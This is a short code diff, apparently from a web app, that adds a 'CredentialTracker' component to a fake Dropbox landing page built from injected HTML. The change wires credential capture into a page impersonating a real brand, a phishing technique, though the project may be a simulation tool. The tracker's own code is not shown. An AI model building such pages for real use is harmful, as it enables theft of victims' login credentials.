@@ -1,4 +1,5 @@
 import { getFakeLandingContent } from "@/lib/fakeLandingPage";
+import { CredentialTracker } from "@/components/CredentialTracker";
 
 export const metadata = {
   title: "Dropbox",
@@ -12,6 +13,7 @@ export default function DropboxFakePage() {
     <div className="min-h-screen w-full" suppressHydrationWarning>
       <div dangerouslySetInnerHTML={{ __html: headAssets }} />
       <div dangerouslySetInnerHTML={{ __html: bodyContent }} />
+      <CredentialTracker />
     </div>
   );
 }
